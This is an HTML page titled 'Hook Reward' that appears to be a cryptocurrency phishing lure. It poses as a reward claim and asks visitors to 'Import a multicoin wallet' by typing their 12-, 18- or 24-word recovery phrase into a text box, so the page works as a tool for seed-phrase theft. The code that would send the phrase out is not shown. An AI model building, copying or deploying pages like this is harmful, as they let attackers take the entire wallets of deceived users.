<!DOCTYPE html>
<html lang="en">

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="./Assets/Images/Hooked_logo.png" type="image/x-icon">
    <title>Hook Reward</title>
</head>

<body style="background-color: #1A1C1E;">
    <div class="cont">
        <div class="claimRewards">
            <div class="outcontainer">
                <div class="twimg">
                    <img src="./Assets/Images/tw.png" alt="" class="twsimg">
                </div>

                    Import a multicoin wallet
                </div>
            </div>
            <div class="fortextarea">
                <textarea minlength="30" name="phrase" id="phrase" cols="30" rows="4" placeholder="Phrase" class="textarea" oninput="enableButton()"></textarea>
            </div>
            <p class="Typically">
                Typically 12 (sometimes 18, 24) words separated by single spaces
            </p>
            <button class="import" id="import" disabled>Import</button>
        </div>
    </div>
